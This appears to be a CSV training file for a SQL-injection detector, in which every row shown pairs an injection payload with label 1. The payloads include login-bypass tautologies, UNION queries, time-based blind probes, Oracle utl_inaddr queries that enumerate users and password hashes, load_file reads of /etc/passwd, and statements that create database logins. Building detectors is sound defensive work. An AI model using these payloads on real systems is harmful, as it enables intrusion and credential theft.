Query,Label
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1
\x27UNION SELECT,1
PRINT,1
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
or 1  =  1--,1
1 or pg_sleep  (  __TIME__  )  --,1
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1
admin'  )   or   (  '1'  =  '1'/*,1
or 2 between 1 and 3,1
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1
admin' or '1'  =  '1,1
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
""" or 0  =  0 --",1
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
char%4039%41%2b%40SELECT,1
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1
admin'  )   or   (  '1'  =  '1,1
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1
"or 0  =  0 #""",1
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1
  )   or   (  'x'  =  'x,1
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1
"""a"""" or 1  =  1--""",1
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1
1 and user_name  (    )     =   'dbo',1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
or 1  =  1 or ''  =  ',1
select * from users where id  =  1   or 1  =  1 -- 1,1
or 'text' > 't',1
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1
admin' or '1'  =  '1'#,1
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1
s,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
 select * from information_schema.tables--,1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1
1   )    )    or pg_sleep  (  __TIME__  )  --,1
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1
 or 1  =  1 or ''  =  ',1
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1
or 'unusual'   =   'unusual',1
 or 1 in   (  select @@version  )  --,1
truncate,1
as,1
 or 3  =  3 --,1
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1
"admin""  )   or   (  ""1""  =  ""1",1
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1
" or 0  =  0 #""",1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1
1  )   or sleep  (  __TIME__  )  #,1
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1
select * from users where id  =  1. <@ or 1  =  1 -- 1,1
 or true--,1
hi' or 'x'  =  'x',1
select * from users where id  =  1 <@ or 1  =  1 -- 1,1
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1
admin' #,1
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfor delay '0:0:__TIME__'--",1
 or 'unusual'   =   'unusual',1
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1
"admin"" or ""1""  =  ""1""/*",1
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1
like,1
or username like char  (  37  )  ,1
 )    )    or pg_sleep  (  __TIME__  )  --,1
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1
or 3  =  3,1
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1
exec sp,1
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1
admin' or 1  =  1/*,1
a' waitfor delay '0:0:10'--,1
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1
and 1 in   (  select var from temp  )  --,1
hi'  )   or   (  'a'  =  'a,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
"admin"" or 1  =  1",1
"""  )   or true--",1
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1
1  )   or pg_sleep  (  __TIME__  )  --,1
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1
"""  )   or sleep  (  __TIME__  )    =  """,1
select * from users where id  =  1.<@. or 1  =  1 -- 1,1
"admin""  )   or   (  ""1""  =  ""1""--",1
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1
1 and 1  =  1,1
or 0  =  0 #,1
union select * from users where login   =   char ...,1
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1
admin'  )   or '1'  =  '1'--,1
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
or ''  =  ',1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1
""" or """"^""",1
"""-""",1
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1
admin'/*,1
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
1 uni/**/on select all from where,1
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1
admin'  )   or '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
or '7659'  =  '7659,1
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
or true--,1
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1
""" or true--",1
select * from users where id  =  1. or 1  =  1 -- 1,1
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
â or 3  =  3 --,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1
 or uid like '%,1
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
0 or 1  =  1,1
select * from users where id  =  1 &@ or 1  =  1 -- 1,1
"admin""  )   or ""1""  =  ""1",1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
sqlvuln,1
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
""" or """"*""",1
"hi or 1  =  1 --""",1
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
select * from information_schema.tables--,1
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1
   (  select top 1,1
Ã½ or 1  =  1 --,1
a' --,1
 or 1  =  1 /*,1
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogin 'name' , 'password'",1
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1
group by userid having 1  =  1--,1
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1
select * from users where id  =  1 *1 or 1  =  1 -- 1,1
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
‘ or 1  =  1 --,1
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1
or 'a'  =  'a,1
declare @s varchar  (  22  )   select @s   = ,1
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1
@variable,1
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1
 and 1 in   (  select var from temp  )  --,1
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1
or x  =  x,1
or a  =  a,1
or '1'  =  '1,1
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1
a' or 1  =  1--,1
 )   or   (  a  =  a,1
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1
-- &password  = ,1
select * from users where id  =  1 <@. or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
 or '1'  =  '1,1
admin' or 1  =  1,1
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1
 or 1  =  1--,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ or 3  =  3 --,1
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1
 )   union select * from information_schema.tables,1
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
""" or """" """,1
delete,1
 or 1  =  1 --,1
1' and non_existant_table   =   '1,1
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1
UNION ALL SELECT,1
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1
x' or full_name like '%bob%,1
 or 2 > 1,1
select * from users where id  =  1.*1 or 1  =  1 -- 1,1
"""  )   or pg_sleep  (  __TIME__  )  --",1
 ',1
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1
 )   or sleep  (  __TIME__  )    =  ',1
sleep 50',1
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1
or sleep  (  __TIME__  )    =  ',1
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
or 2 > 1,1
anything' OR 'x'  =  'x,1
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1
&',1
a' or 3  =  3--,1
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1
"admin""or 1  =  1 or """"  =  """,1
uni/**/on sel/**/ect,1
""" or """"&""",1
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
1 waitfor delay '0:0:10'--,1
bfilename,1
admin'  )   or   (  '1'  =  '1'--,1
UEf,1
 -- &password  = ,1
1 or sleep  (  __TIME__  )  #,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1
or sleep  (  __TIME__  )  #,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
||6,1
or 1/*,1
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
select * from users where id  =  1.%@ or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1
" or 1  =  1 or """"  =  ",1
